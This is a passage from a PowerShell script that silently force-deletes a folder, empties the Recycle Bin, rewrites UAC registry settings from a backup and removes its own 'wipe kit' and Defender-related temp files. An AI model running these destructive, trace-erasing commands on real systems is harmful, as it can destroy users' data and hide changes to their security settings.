        cmd /c "del /f /q `"$($_.FullName)`"" | Out-Null
      }
    }
    cmd /c "rmdir /s /q `"$p`"" | Out-Null
    if (Test-Path -LiteralPath $p) { Remove-Item -LiteralPath $p -Recurse -Force -EA SilentlyContinue }
    if (-not (Test-Path -LiteralPath $p)) { break }
    Start-Sleep -Seconds 1
  }
}
Clear-RecycleBin -Force -EA SilentlyContinue

# --- UAC LAST (keep silent during restore/shred above) ---
if (Test-Path $sysPol) {
  $lua = 1; if ($uj -and $null -ne $uj.EnableLUA) { $lua = [int]$uj.EnableLUA }
  $cpa = 5; if ($uj -and $null -ne $uj.ConsentPromptBehaviorAdmin) { $cpa = [int]$uj.ConsentPromptBehaviorAdmin }
  $psd = 1; if ($uj -and $null -ne $uj.PromptOnSecureDesktop) { $psd = [int]$uj.PromptOnSecureDesktop }
  $eid = 1; if ($uj -and $null -ne $uj.EnableInstallerDetection) { $eid = [int]$uj.EnableInstallerDetection }
  $cpu = 3; if ($uj -and $null -ne $uj.ConsentPromptBehaviorUser) { $cpu = [int]$uj.ConsentPromptBehaviorUser }
  Set-ItemProperty $sysPol -Name EnableLUA -Value $lua -Type DWord -Force
  Set-ItemProperty $sysPol -Name ConsentPromptBehaviorAdmin -Value $cpa -Type DWord -Force
  Set-ItemProperty $sysPol -Name ConsentPromptBehaviorUser -Value $cpu -Type DWord -Force
  Set-ItemProperty $sysPol -Name PromptOnSecureDesktop -Value $psd -Type DWord -Force
  Set-ItemProperty $sysPol -Name EnableInstallerDetection -Value $eid -Type DWord -Force
}
Remove-Item $uacBak -Force -EA SilentlyContinue

# Final: wipe kit + TEMP enable leftovers (restore finished)
Remove-Item $enTemp -Force -EA SilentlyContinue
Get-ChildItem $env:TEMP -Filter 'hh-enable-defender.exe' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
Get-ChildItem $env:TEMP -Filter 'hh-restore-manual-*.ps1' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
Get-ChildItem $env:TEMP -Filter 'hh-restore-security.ps1' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
Get-ChildItem $env:TEMP -Filter 'hh-restore-elev.ps1' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
Get-ChildItem $env:TEMP -Filter 'hh-wipe-state.json' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
Get-ChildItem $env:TEMP -Filter 'hh-defender-*' -EA SilentlyContinue | Remove-Item -Force -Recurse -EA SilentlyContinue
Get-ChildItem $env:TEMP -Filter 'REPARER-DEFENDER*' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue
# Remove wipe kit last (STOP already written; EarlyAV gone)
if (Test-Path $kit) {
  Get-ChildItem $kit -Force -EA SilentlyContinue | Remove-Item -Force -Recurse -EA SilentlyContinue
  Remove-Item $kit -Force -Recurse -EA SilentlyContinue
}

Write-Output 'security-restored'
